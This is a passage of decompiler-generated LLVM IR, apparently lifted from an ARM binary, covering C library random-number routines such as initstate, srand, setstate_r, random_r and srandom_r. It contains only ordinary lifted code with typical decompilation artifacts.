  %v1_dadc = call i32 @__pthread_return_void()
  %v1_daec = call i32 @__pthread_return_0()
  %v3_dafc = load i32, i32* bitcast (i32** @global_var_1d6f0.578 to i32*), align 4
  store i32 %v3_dafc, i32* @r4, align 4
  %v3_db00 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_1d6e8)
  %v1_db08 = icmp slt i32 %v3_db00, 0
  store i32 %v2_dac0, i32* @r0, align 4
  %. = select i1 %v1_db08, i32 0, i32 ptrtoint (i32** @global_var_1d6ec.580 to i32)
  %v1_db20 = call i32 @__pthread_return_void()
  ret i32 %.
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_db50 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_db50, i32* @r0, align 4
  %v1_db74 = call i32 @__pthread_return_void()
  %v1_db84 = call i32 @__pthread_return_0()
  %v0_db8c = load i32, i32* @r5, align 4
  %v0_db90 = load i32, i32* @r6, align 4
  %v0_db94 = load i32, i32* @r8, align 4
  store i32 %v0_db94, i32* @r0, align 4
  %v3_db98 = load i32, i32* bitcast (i32** @global_var_1d6f0.578 to i32*), align 4
  store i32 %v3_db98, i32* @r4, align 4
  %v4_db9c = inttoptr i32 %v0_db94 to i32*
  %v5_db9c = call i32 @__GI_initstate_r(i32* %v4_db9c, i32 %v0_db8c, i32 %v0_db90, i32 ptrtoint (i32* @global_var_1d6e8 to i32))
  store i32 %v2_db50, i32* @r0, align 4
  %v1_dbb0 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_1d6ec.580 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_dbe0 = load i32, i32* @r4, align 4
  %v9_dbe0 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_1d6d0.565 to i32), i32* @r4, align 4
  %v2_dbe8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_dbe8, i32* @r0, align 4
  %v1_dc04 = call i32 @__pthread_return_void()
  %v1_dc14 = call i32 @__pthread_return_0()
  %v0_dc18 = load i32, i32* @r6, align 4
  store i32 %v0_dc18, i32* @r0, align 4
  %v2_dc20 = inttoptr i32 %v0_dc18 to i32*
  %v3_dc20 = call i32 @srandom_r(i32* %v2_dc20, i32 ptrtoint (i32* @global_var_1d6e8 to i32))
  store i32 %v2_dbe8, i32* @r0, align 4
  %v1_dc38 = call i32 @__pthread_return_void()
  store i32 %v3_dbe0, i32* @r4, align 4
  store i32 %v9_dbe0, i32* @r6, align 4
  ret i32 %v1_dc38

; uselistorder directives
  uselistorder i32* @global_var_1d6e8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1d6e8 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_dc5c = add i32 %tmp, 12
  %v2_dc5c = inttoptr i32 %v1_dc5c to i32*
  %v3_dc5c = load i32, i32* %v2_dc5c, align 4
  %v3_dc60 = load i32, i32* @r4, align 4
  store i32 %v3_dc60, i32* %stack_var_-20, align 4
  %v2_dc64 = icmp eq i32 %v3_dc5c, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_dc64, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_dc701 = add i32 %tmp, 8
  %v2_dc702 = inttoptr i32 %v1_dc701 to i32*
  %v3_dc703 = load i32, i32* %v2_dc702, align 4
  store i32 %v3_dc703, i32* %r1.global-to-local, align 4
  %v3_dc84 = add i32 %v3_dc703, -4
  %v4_dc84 = inttoptr i32 %v3_dc84 to i32*
  store i32 0, i32* %v4_dc84, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_dc6c = add i32 %tmp, 4
  %v3_dc6c = inttoptr i32 %v2_dc6c to i32*
  %v4_dc6c = load i32, i32* %v3_dc6c, align 4
  %v1_dc70 = add i32 %tmp, 8
  %v2_dc70 = inttoptr i32 %v1_dc70 to i32*
  %v3_dc70 = load i32, i32* %v2_dc70, align 4
  store i32 %v3_dc70, i32* %r1.global-to-local, align 4
  %v3_dc74 = sub i32 %v4_dc6c, %v3_dc70
  %v4_dc78 = sdiv i32 %v3_dc74, 4
  %v4_dc80 = mul i32 %v4_dc78, 5
  %v5_dc80 = add i32 %v4_dc80, %v3_dc5c
  %v3_dc88 = add i32 %v3_dc70, -4
  %v4_dc88 = inttoptr i32 %v3_dc88 to i32*
  store i32 %v5_dc80, i32* %v4_dc88, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_dc8c = add i32 %arg1, 4
  store i32 %v1_dc8c, i32* %r6.global-to-local, align 4
  %v2_dc90 = inttoptr i32 %arg1 to i32*
  %v3_dc90 = load i32, i32* %v2_dc90, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_dc98 = srem i32 %v3_dc90, 5
  store i32 %v2_dc98, i32* %r0.global-to-local, align 4
  %v2_dca4 = and i32 %v2_dc98, 1073741824
  %v3_dca4 = icmp ne i32 %v2_dca4, 0
  %v4_dca4 = mul nsw i32 %v2_dc98, 4
  %v2_dca8 = icmp ne i32 %v2_dc98, 4
  %v3_dca8 = and i1 %v3_dca4, %v2_dca8
  br i1 %v3_dca8, label %dec_label_pc_dd04, label %dec_label_pc_dcac

dec_label_pc_dcac:                                ; preds = %bb
  %v5_dca4 = add i32 %v4_dca4, ptrtoint (i32* @global_var_14328.594 to i32)
  %v1_dcac = add i32 %v4_dca4, add (i32 ptrtoint (i32* @global_var_14328.594 to i32), i32 20)
  %v2_dcac = inttoptr i32 %v1_dcac to i32*
  %v3_dcac = load i32, i32* %v2_dcac, align 4
  store i32 %v3_dcac, i32* %r5.global-to-local, align 4
  %v6_dcb0 = inttoptr i32 %v5_dca4 to i32*
  %v7_dcb0 = load i32, i32* %v6_dcb0, align 4
  store i32 %v7_dcb0, i32* %r7.global-to-local, align 4
  %v2_dcb4 = icmp eq i32 %v2_dc98, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_dcbc = load i32, i32* %r4.global-to-local, align 4
  %v2_dcbc = add i32 %v1_dcbc, 16
  %v3_dcbc = inttoptr i32 %v2_dcbc to i32*
  store i32 %v3_dcac, i32* %v3_dcbc, align 4
  %v0_dcc0 = load i32, i32* %r7.global-to-local, align 4
  %v1_dcc0 = load i32, i32* %r4.global-to-local, align 4
  %v2_dcc0 = add i32 %v1_dcc0, 20
  %v3_dcc0 = inttoptr i32 %v2_dcc0 to i32*
  store i32 %v0_dcc0, i32* %v3_dcc0, align 4
  %v0_dcc4 = load i32, i32* %r0.global-to-local, align 4
  %v1_dcc4 = load i32, i32* %r4.global-to-local, align 4
  %v2_dcc4 = add i32 %v1_dcc4, 12
  %v3_dcc4 = inttoptr i32 %v2_dcc4 to i32*
  store i32 %v0_dcc4, i32* %v3_dcc4, align 4
  br i1 %v2_dcb4, label %dec_label_pc_dcf0, label %dec_label_pc_dccc

dec_label_pc_dccc:                                ; preds = %dec_label_pc_dcac
  %v0_dccc = load i32, i32* %r6.global-to-local, align 4
  %v1_dccc = add i32 %v0_dccc, -4
  %v2_dccc = inttoptr i32 %v1_dccc to i32*
  %v3_dccc = load i32, i32* %v2_dccc, align 4
  %v1_dcd0 = load i32, i32* %r1.global-to-local, align 4
  %v2_dcd0 = sdiv i32 %v3_dccc, %v1_dcd0
  store i32 %v2_dcd0, i32* %r0.global-to-local, align 4
  %v4_dcd4 = mul i32 %v2_dcd0, 4
  %v5_dcd4 = add i32 %v4_dcd4, %v0_dccc
  %v1_dcd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_dcd8 = add i32 %v1_dcd8, 4
  %v3_dcd8 = inttoptr i32 %v2_dcd8 to i32*
  store i32 %v5_dcd4, i32* %v3_dcd8, align 4
  %v0_dcdc = load i32, i32* %r0.global-to-local, align 4
  %v1_dcdc = load i32, i32* %r7.global-to-local, align 4
  %v2_dcdc = add i32 %v1_dcdc, %v0_dcdc
  %v0_dce0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_dce0, i32* %r1.global-to-local, align 4
  %v2_dce4 = srem i32 %v2_dcdc, %v0_dce0
  %v0_dce8 = load i32, i32* %r6.global-to-local, align 4
  %v4_dce8 = mul i32 %v2_dce4, 4
  %v5_dce8 = add i32 %v0_dce8, %v4_dce8
  store i32 %v5_dce8, i32* %r0.global-to-local, align 4
  %v1_dcec = load i32, i32* %r4.global-to-local, align 4
  %v2_dcec = inttoptr i32 %v1_dcec to i32*
  store i32 %v5_dce8, i32* %v2_dcec, align 4
  br label %dec_label_pc_dcf0

dec_label_pc_dcf0:                                ; preds = %dec_label_pc_dcac, %dec_label_pc_dccc
  %v0_dcf0 = load i32, i32* %r6.global-to-local, align 4
  %v1_dcf0 = load i32, i32* %r5.global-to-local, align 4
  %v4_dcf0 = mul i32 %v1_dcf0, 4
  %v5_dcf0 = add i32 %v4_dcf0, %v0_dcf0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_dcf8 = load i32, i32* %r4.global-to-local, align 4
  %v2_dcf8 = add i32 %v1_dcf8, 24
  %v3_dcf8 = inttoptr i32 %v2_dcf8 to i32*
  store i32 %v5_dcf0, i32* %v3_dcf8, align 4
  %v0_dcfc = load i32, i32* %r6.global-to-local, align 4
  %v1_dcfc = load i32, i32* %r4.global-to-local, align 4
  %v2_dcfc = add i32 %v1_dcfc, 8
  %v3_dcfc = inttoptr i32 %v2_dcfc to i32*
  store i32 %v0_dcfc, i32* %v3_dcfc, align 4
  %v2_dd00 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_dd00, i32* %r4.global-to-local, align 4
  ret i32 0

dec_label_pc_dd04:                                ; preds = %bb
  %v0_dd04 = call i32 @__errno_location()
  %v2_dd0c = inttoptr i32 %v0_dd04 to i32*
  store i32 22, i32* %v2_dd0c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_dd14 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_dd14, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_dc98, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 3, 4, 0, 1, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dcf0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_dd1c = add i32 %tmp, 12
  %v2_dd1c = inttoptr i32 %v1_dd1c to i32*
  %v3_dd1c = load i32, i32* %v2_dd1c, align 4
  store i32 %v3_dd1c, i32* %r3.global-to-local, align 4
  %v2_dd20 = icmp eq i32 %v3_dd1c, 0
  %v3_dd24 = load i32, i32* @r4, align 4
  store i32 %v3_dd24, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* @ip, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_dd30 = add i32 %tmp, 8
  %v2_dd30 = inttoptr i32 %v1_dd30 to i32*
  %v3_dd30 = load i32, i32* %v2_dd30, align 4
  store i32 %v3_dd30, i32* %lr.global-to-local, align 4
  br i1 %v2_dd20, label %dec_label_pc_dd38, label %dec_label_pc_dd5c

dec_label_pc_dd38:                                ; preds = %entry
  %v1_dd38 = inttoptr i32 %v3_dd30 to i32*
  %v2_dd38 = load i32, i32* %v1_dd38, align 4
  store i32 %v2_dd38, i32* %r2.global-to-local, align 4
  %v2_dd40 = mul i32 %v2_dd38, 1103515245
  %v1_dd48 = add i32 %v2_dd40, 12345
  %tmp10 = bitcast i32 %v1_dd48 to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_dd4c = bitcast float %tmp11 to i32
  store i32 %v1_dd4c, i32* %r3.global-to-local, align 4
  store i32 %v1_dd4c, i32* %v1_dd38, align 4
  %v0_dd54 = load i32, i32* %r3.global-to-local, align 4
  %v2_dd54 = inttoptr i32 %arg2 to i32*
  store i32 %v0_dd54, i32* %v2_dd54, align 4
  br label %dec_label_pc_dda0

dec_label_pc_dd5c:                                ; preds = %entry
  %v2_dd5c = load i32, i32* %arg1, align 4
  store i32 %v2_dd5c, i32* %r2.global-to-local, align 4
  %v1_dd60 = add i32 %tmp, 4
  %v2_dd60 = inttoptr i32 %v1_dd60 to i32*
  %v3_dd60 = load i32, i32* %v2_dd60, align 4
  store i32 %v3_dd60, i32* %r0.global-to-local, align 4
  %v1_dd64 = inttoptr i32 %v2_dd5c to i32*
  %v2_dd64 = load i32, i32* %v1_dd64, align 4
  store i32 %v2_dd64, i32* %r3.global-to-local, align 4
  %v1_dd68 = inttoptr i32 %v3_dd60 to i32*
  %v2_dd68 = load i32, i32* %v1_dd68, align 4
  %v4_dd68 = add i32 %v3_dd60, 4
  store i32 %v4_dd68, i32* %r0.global-to-local, align 4
  %v2_dd6c = add i32 %v2_dd68, %v2_dd64
  store i32 %v2_dd6c, i32* %r3.global-to-local, align 4
  store i32 %v2_dd6c, i32* %v1_dd64, align 4
  %v3_dd70 = load i32, i32* %r2.global-to-local, align 4
  %v4_dd70 = add i32 %v3_dd70, 4
  store i32 %v4_dd70, i32* %r2.global-to-local, align 4
  %v0_dd74 = load i32, i32* @ip, align 4
  %v1_dd74 = add i32 %v0_dd74, 24
  %v2_dd74 = inttoptr i32 %v1_dd74 to i32*
  %v3_dd74 = load i32, i32* %v2_dd74, align 4
  store i32 %v3_dd74, i32* %r4.global-to-local, align 4
  %v0_dd78 = load i32, i32* %r3.global-to-local, align 4
  %v3_dd78 = udiv i32 %v0_dd78, 2
  store i32 %v3_dd78, i32* %r3.global-to-local, align 4
  %v3_dd7c = icmp ult i32 %v4_dd70, %v3_dd74
  %v1_dd80 = load i32, i32* %r5.global-to-local, align 4
  %v2_dd80 = inttoptr i32 %v1_dd80 to i32*
  store i32 %v3_dd78, i32* %v2_dd80, align 4
  br i1 %v3_dd7c, label %dec_label_pc_dd90, label %bb

bb:                                               ; preds = %dec_label_pc_dd5c
  %v1_dd84 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_dd84, i32* %r2.global-to-local, align 4
  %v0_dd88 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_dd88, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_dd90:                                ; preds = %dec_label_pc_dd5c
  %v0_dd881 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_dd881, i32* %r3.global-to-local, align 4
  %v1_dd90 = load i32, i32* %r4.global-to-local, align 4
  %v3_dd90 = icmp ult i32 %v0_dd881, %v1_dd90
  br i1 %v3_dd90, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_dd90
  store i32 %v0_dd881, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_dd90
  %v1_dd98 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_dd98, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_dd9c = load i32, i32* @ip, align 4
  %v1_dd9c = inttoptr i32 %v0_dd9c to i32*
  %v2_dd9c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_dd9c, i32* %v1_dd9c, align 4
  %v3_dd9c = add i32 %v0_dd9c, 4
  %v4_dd9c = inttoptr i32 %v3_dd9c to i32*
  %v5_dd9c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_dd9c, i32* %v4_dd9c, align 4
  br label %dec_label_pc_dda0

dec_label_pc_dda0:                                ; preds = %dec_label_pc_dd38, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_dda4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_dda4, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_dd881, { 1, 0, 2 }
  uselistorder i32 %v3_dd78, { 1, 0 }
  uselistorder i32 %v1_dd4c, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_dda0, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ddac = load i32, i32* @r4, align 4
  store i32 %v3_ddac, i32* %stack_var_-32, align 4
  %v6_ddac = load i32, i32* @r5, align 4
  %v1_ddb0 = add i32 %tmp, 12
  %v2_ddb0 = inttoptr i32 %v1_ddb0 to i32*
  %v3_ddb0 = load i32, i32* %v2_ddb0, align 4
  %v2_ddb8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_ddb0, 4
  br i1 %tmp29, label %.dec_label_pc_de64_crit_edge, label %dec_label_pc_ddc8

.dec_label_pc_de64_crit_edge:                     ; preds = %entry
  br label %dec_label_pc_de64

dec_label_pc_ddc8:                                ; preds = %entry
  %v0_ddc8 = load i32, i32* @r0, align 4
  %v2_ddc8 = icmp eq i32 %v0_ddc8, 0
  %v1_ddcc = add i32 %tmp, 8
  %v2_ddcc = inttoptr i32 %v1_ddcc to i32*
  %v3_ddcc = load i32, i32* %v2_ddcc, align 4
  store i32 %v3_ddcc, i32* %r7.global-to-local, align 4
  br i1 %v2_ddc8, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_ddc8
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_ddc8, %bb
  %v0_ddd8 = phi i32 [ %v0_ddc8, %dec_label_pc_ddc8 ], [ 1, %bb ]
  %v2_ddd4 = icmp eq i32 %v3_ddb0, 0
  %v2_ddd8 = inttoptr i32 %v3_ddcc to i32*
  store i32 %v0_ddd8, i32* %v2_ddd8, align 4
  br i1 %v2_ddd4, label %dec_label_pc_de60, label %dec_label_pc_dde0

dec_label_pc_dde0:                                ; preds = %bb21
  %v1_dde0 = add i32 %tmp, 16
  %v2_dde0 = inttoptr i32 %v1_dde0 to i32*
  %v3_dde0 = load i32, i32* %v2_dde0, align 4
  store i32 %v3_dde0, i32* %sb.global-to-local, align 4
  %v0_dde4 = load i32, i32* @r0, align 4
  %v0_dde8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_dde8, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_de3023 = icmp sgt i32 %v3_dde0, 1
  br i1 %v5_de3023, label %dec_label_pc_ddf4, label %dec_label_pc_de34

dec_label_pc_ddf4:                                ; preds = %dec_label_pc_dde0, %dec_label_pc_ddf4
  %v0_de0425 = phi i32 [ %v0_de24.pre, %dec_label_pc_ddf4 ], [ %v0_dde4, %dec_label_pc_dde0 ]
  %v1_de1c24 = phi i32 [ %v5_de1c, %dec_label_pc_ddf4 ], [ %v0_dde8, %dec_label_pc_dde0 ]
  %v2_ddf4 = srem i32 %v0_de0425, ptrtoint (i32* @global_var_1f31d.598 to i32)
  %v2_de00 = mul i32 %v2_ddf4, 16807
  %v2_de08 = sdiv i32 %v0_de0425, ptrtoint (i32* @global_var_1f31d.598 to i32)
  %tmp30 = mul i32 %v2_de08, -2836
  %v2_de14 = add i32 %v2_de00, %tmp30
  %v8_de14 = icmp slt i32 %v2_de14, 0
  %v2_de18 = add i32 %v2_de14, 2147483647
  %v2_de18.v2_de14 = select i1 %v8_de14, i32 %v2_de18, i32 %v2_de14
  store i32 %v2_de18.v2_de14, i32* @r5, align 4
  %v2_de1c = add i32 %v1_de1c24, 4
  %v3_de1c = inttoptr i32 %v2_de1c to i32*
  store i32 %v2_de18.v2_de14, i32* %v3_de1c, align 4
  %v4_de1c = load i32, i32* %sl.global-to-local, align 4
  %v5_de1c = add i32 %v4_de1c, 4
  store i32 %v5_de1c, i32* %sl.global-to-local, align 4
  %v0_de20.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_de20.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_de24.pre = load i32, i32* @r5, align 4
  %v1_de2c = add i32 %v0_de20.pre, 1
  store i32 %v1_de2c, i32* %r8.global-to-local, align 4
  %v5_de30 = icmp slt i32 %v0_de20.pre, %v1_de20.pre
  br i1 %v5_de30, label %dec_label_pc_ddf4, label %dec_label_pc_de20.dec_label_pc_de34_crit_edge

dec_label_pc_de20.dec_label_pc_de34_crit_edge:    ; preds = %dec_label_pc_ddf4
  %v0_de40.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_de34

dec_label_pc_de34:                                ; preds = %dec_label_pc_de20.dec_label_pc_de34_crit_edge, %dec_label_pc_dde0
  %v0_de40 = phi i32 [ %v0_de40.pre, %dec_label_pc_de20.dec_label_pc_de34_crit_edge ], [ %v0_dde8, %dec_label_pc_dde0 ]
  %v0_de38.lcssa = phi i32 [ %v1_de20.pre, %dec_label_pc_de20.dec_label_pc_de34_crit_edge ], [ %v3_dde0, %dec_label_pc_dde0 ]
  %v2_de38 = mul i32 %v0_de38.lcssa, 10
  store i32 %v2_de38, i32* @r4, align 4
  %v0_de3c = load i32, i32* %r6.global-to-local, align 4
  %v1_de3c = add i32 %v0_de3c, 20
  %v2_de3c = inttoptr i32 %v1_de3c to i32*
  %v3_de3c = load i32, i32* %v2_de3c, align 4
  %v4_de40 = mul i32 %v3_de3c, 4
  %v5_de40 = add i32 %v0_de40, %v4_de40
  %v1_de44 = inttoptr i32 %v0_de3c to i32*
  store i32 %v5_de40, i32* %v1_de44, align 4
  %v3_de44 = add i32 %v0_de3c, 4
  %v4_de44 = inttoptr i32 %v3_de44 to i32*
  %v5_de44 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_de44, i32* %v4_de44, align 4
  br label %dec_label_pc_de50

dec_label_pc_de4c:                                ; preds = %dec_label_pc_de50
  %v0_de54 = load i32, i32* %r6.global-to-local, align 4
  %v2_de4c = inttoptr i32 %v0_de54 to i32*
  %v3_de4c = call i32 @__GI_random_r(i32* %v2_de4c, i32 %v2_ddb8)
  br label %dec_label_pc_de50

dec_label_pc_de50:                                ; preds = %dec_label_pc_de34, %dec_label_pc_de4c
  %v0_de50 = load i32, i32* @r4, align 4
  %v1_de50 = add i32 %v0_de50, -1
  store i32 %v1_de50, i32* @r4, align 4
  %v6_de50 = icmp slt i32 %v1_de50, 0
  br i1 %v6_de50, label %dec_label_pc_de60, label %dec_label_pc_de4c

dec_label_pc_de60:                                ; preds = %dec_label_pc_de50, %bb21
  %v2_de68.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_de64

dec_label_pc_de64:                                ; preds = %.dec_label_pc_de64_crit_edge, %dec_label_pc_de60
  %v2_de68 = phi i32 [ %v3_ddac, %.dec_label_pc_de64_crit_edge ], [ %v2_de68.pre, %dec_label_pc_de60 ]
  %v26_de68 = phi i32 [ -1, %.dec_label_pc_de64_crit_edge ], [ 0, %dec_label_pc_de60 ]
  store i32 %v2_de68, i32* @r4, align 4
  store i32 %v6_ddac, i32* @r5, align 4
  ret i32 %v26_de68

; uselistorder directives
  uselistorder i32 %v1_de50, { 1, 0 }
  uselistorder i32 %v0_de3c, { 1, 0, 2 }
  uselistorder i32 %v0_de20.pre, { 1, 0 }
  uselistorder i32 %v5_de1c, { 1, 0 }
  uselistorder i32 %v2_de14, { 2, 1, 0 }
  uselistorder i32 %v0_de0425, { 1, 0 }
  uselistorder i32 %v0_dde8, { 1, 0, 2 }
  uselistorder i32 %v3_dde0, { 1, 0, 2 }
  uselistorder i32 %v3_ddb0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 3, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1f31d.598 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_de64, { 1, 0 }
  uselistorder label %dec_label_pc_de50, { 1, 0 }
  uselistorder label %dec_label_pc_ddf4, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_de6c:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_de6c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_de6c, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_de6c
  %v2_de6c = load i32, i32* @r7, align 4
  %v5_de6c = udiv i32 %v2_de6c, 8
  %v6_de6c = and i32 %v5_de6c, %arg1
  store i32 %v6_de6c, i32* %r4.global-to-local, align 4
  %v2_de70 = load i32, i32* @sp, align 4
  %v8_de70 = shl i32 %v2_de70, %arg3
  %v9_de70 = and i32 %v8_de70, %arg2
  call void @__pseudo_branch(i32 %v9_de70)
  %v0_de74.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_de74 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_de74.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_de74 = load i32, i32* %r4.global-to-local, align 4
  %v3_de74 = load i32, i32* @fp, align 4
  %v8_de74 = shl i32 %v2_de74, %v3_de74
  %v9_de74 = and i32 %v8_de74, %v1_de74
  store i32 %v9_de74, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_de6c, %bb
  %v10_de74 = phi i32 [ %arg1, %dec_label_pc_de6c ], [ %v9_de74, %bb ], [ %v1_de74, %.thread ]
  ret i32 %v10_de74

; uselistorder directives
  uselistorder i32 %v1_de74, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_de7c = load i32, i32* @r4, align 4
  store i32 %v3_de7c, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_de9c, label %dec_label_pc_de8c

dec_label_pc_de8c:                                ; preds = %entry
  %v2_de8c = icmp ugt i32 %arg2, 254
  %v7_de8c = icmp eq i32 %arg2, 255
  %v2_de90 = xor i1 %v7_de8c, true
  %v3_de90 = and i1 %v2_de8c, %v2_de90
  br i1 %v3_de90, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_de8c
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_de8c, %bb
  %v1_dec47 = phi i32 [ %v3_de7c, %dec_label_pc_de8c ], [ 4, %bb ]
  %v2_de94 = xor i1 %v2_de8c, true
  %v3_de94 = or i1 %v7_de8c, %v2_de94
  br i1 %v3_de94, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_de9c:                                ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_deb4, label %dec_label_pc_dea4

dec_label_pc_dea4:                                ; preds = %dec_label_pc_de9c
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_df20

.thread10:                                        ; preds = %dec_label_pc_dea4
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_deb4:                                ; preds = %dec_label_pc_de9c
